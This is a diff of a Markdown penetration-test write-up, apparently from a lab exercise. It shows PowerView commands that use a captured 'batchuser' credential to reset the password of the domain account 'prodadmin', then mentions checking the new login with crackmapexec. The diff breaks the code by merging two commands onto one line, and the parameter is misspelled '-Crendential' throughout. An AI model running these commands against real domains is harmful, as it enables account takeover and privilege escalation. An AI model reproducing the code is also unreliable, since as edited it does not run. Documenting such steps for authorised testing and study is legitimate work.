@@ -8,11 +8,8 @@ user’s current password. To accomplish this we will load PowerView5 and run th
 ```
 Import-Module .\PowerView_dev.ps1
 $SecPassword = ConvertTo-SecureString '[strings]' -AsPlainText -Force
-$Cred = New-Object 
-System.Management.Automation.PSCredential('domain\batchuser', $SecPassword)
-$UserPassword = ConvertTo-SecureString 'Password1!' -AsPlainText -Force
-Set-DomainUserPassword -Identity prodadmin -AccountPassword $UserPassword 
--Crendential $Cred
+$Cred = New-Object System.Management.Automation.PSCredential('domain\batchuser', $SecPassword)
+$UserPassword = ConvertTo-SecureString 'Password1!' -AsPlainText -Force Set-DomainUserPassword -Identity prodadmin -AccountPassword $UserPassword -Crendential $Cred
 ```
 Once again, we use crackmapexec to verify the credentials work
 ```
